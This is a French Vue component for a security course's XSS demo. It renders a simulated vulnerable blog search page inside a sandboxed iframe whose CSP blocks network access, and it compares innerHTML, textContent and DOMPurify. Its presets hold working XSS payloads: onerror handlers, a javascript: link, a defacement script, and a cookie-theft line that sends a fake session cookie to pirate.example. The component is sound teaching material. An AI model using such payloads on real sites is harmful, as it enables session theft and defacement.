<script setup>
// Démo 5 : XSS. Une page vulnérable simulée tourne dans un cadre isolé (sandbox sans allow-same-origin, sans réseau).
// Le « cookie » est factice : aucune donnée réelle n'est en jeu.
import { onBeforeUnmount, onMounted, ref, watch } from 'vue'
import DOMPurify from 'dompurify'
import { forgetDemos, runDemo } from '../../lib/demoFrame.js'

const payload = ref('<b>Bonjour</b> tout le monde')
const mode = ref('vuln') // vuln = innerHTML · text = textContent · clean = DOMPurify puis innerHTML
const stage = ref(null)
const removed = ref([])

const PRESETS = [
  { label: 'HTML légitime', v: '<b>Bonjour</b> tout le monde' },
  { label: 'Balise <script>', v: '<script>log("script exécuté")</' + 'script>' },
  { label: 'Image piégée (onerror)', v: `<img src=x onerror="log('Cookie lu : '+fakeSession)">` },
  { label: 'Vol de cookie', v: `<img src=x onerror="log('Cookie lu : '+fakeSession);fetch('https://pirate.example/?c='+encodeURIComponent(fakeSession)).catch(function(){log('Envoi vers pirate.example : échec')})">` },
  { label: 'Défigurer la page', v: `<img src=x onerror="document.body.style.background='#ffd6d6';document.getElementById('app').insertAdjacentHTML('afterbegin','<h2 style=color:#c00>SITE PIRATÉ</h2>')">` },
  { label: 'Lien javascript:', v: `<a href="javascript:log('XSS via un lien : cliqué !')">Clique ici</a>` },
]
const EXPLAIN = {
  vuln: "Le texte est inséré avec innerHTML : le navigateur l'interprète comme du HTML. Une balise <script> ainsi insérée ne s'exécute pas, mais un gestionnaire d'événement (onerror, onclick…) ou un lien javascript: SI. C'est l'erreur classique.",
  text: "Le texte est inséré avec textContent : il reste du TEXTE, jamais du code. C'est la bonne réponse par défaut : l'encodage de sortie. Les balises s'affichent telles quelles.",
  clean: "Quand il faut vraiment autoriser du HTML (un éditeur, des articles), on le nettoie avec une bibliothèque éprouvée (DOMPurify), jamais avec ses propres expressions régulières.",
}

// Code de la page vulnérable simulée. La saisie est passée en JSON dont « < » est échappé : impossible de fermer la balise script.
const OPEN = '<' + 'script>', CLOSE = '<' + '/script>'
function frameCode() {
  let value = payload.value
  removed.value = []
  if (mode.value === 'clean') {
    value = DOMPurify.sanitize(payload.value)
    removed.value = (DOMPurify.removed ?? []).map((r) => (r.element ? `<${r.element.nodeName.toLowerCase()}>` : `attribut ${r.attribute?.name}`))
  }
  const data = JSON.stringify(value).replace(/</g, '\\u003c')
  const sink = mode.value === 'text' ? 'textContent' : 'innerHTML'
  return `<div id="app" style="font:14px system-ui;color:#111"><h3 style="margin:0 0 8px">MonBlog · recherche</h3>`
    + `<p style="margin:0 0 8px">Résultats pour : <span id="out" style="background:#eef;padding:2px 6px;border-radius:4px"></span></p>`
    + `<p style="margin:0 0 6px;color:#555">Cookie de session (simulé) : <code>sid=7f3a9c1e</code></p>`
    + `<pre id="log" style="margin:0;padding:8px;background:#111;color:#8f8;font-size:12px;min-height:36px;white-space:pre-wrap;border-radius:6px">journal de la page…</pre></div>`
    + `${OPEN}var fakeSession='sid=7f3a9c1e',L=document.getElementById('log'),first=true;`
    + `function log(m){if(first){L.textContent='';first=false}L.textContent+=m+'\\n'}`
    + `document.addEventListener('securitypolicyviolation',function(e){if(e.effectiveDirective==='img-src')return;log('🛡️ Bloqué par la CSP : '+e.effectiveDirective+' → '+e.blockedURI)});`
    + `document.getElementById('out').${sink}=${data}${CLOSE}`
}
function run() { if (stage.value) runDemo(stage.value, frameCode(), 'Page vulnérable simulée') }
const use = (x) => { payload.value = x.v; run() }
watch(mode, run)
onMounted(run)
onBeforeUnmount(() => forgetDemos())
</script>

<template>
  <div class="lab">
    <div class="lab-card">
      <h3>Moteur de recherche d'un blog (simulé)</h3>
      <p class="lab-note">Le visiteur tape une recherche et la page l'affiche. Que se passe-t-il si cette « recherche » est du code ?</p>
      <div class="lab-chips" role="group" aria-label="Exemples de saisies">
        <button v-for="x in PRESETS" :key="x.label" class="lab-chip" type="button" @click="use(x)">{{ x.label }}</button>
      </div>
      <label>Saisie du visiteur<textarea v-model="payload" rows="3" spellcheck="false" maxlength="600" /></label>
      <div class="lab-row" role="radiogroup" aria-label="Façon d'afficher la saisie">
        <label><input v-model="mode" type="radio" value="vuln"> Vulnérable (innerHTML)</label>
        <label><input v-model="mode" type="radio" value="text"> Encodage (textContent)</label>
        <label><input v-model="mode" type="radio" value="clean"> Nettoyage (DOMPurify)</label>
      </div>
      <button class="lab-btn primary" type="button" @click="run">Exécuter</button>
      <p class="lab-note">{{ EXPLAIN[mode] }}</p>
      <p v-if="mode === 'clean' && removed.length" class="lab-ok">DOMPurify a retiré : {{ removed.join(', ') }}</p>
    </div>

    <div class="lab-card">
      <h3>La page, dans un cadre isolé</h3>
      <div ref="stage" class="lab-frame" />
      <p class="lab-note">Le cadre est un <code>iframe sandbox="allow-scripts"</code> sans accès au site et une CSP interdit tout réseau : le « vol de cookie » échoue et la CSP le signale (🛡️). Même si une faille XSS existe, une bonne CSP limite les dégâts : c'est la défense en profondeur.</p>
    </div>
  </div>
</template>
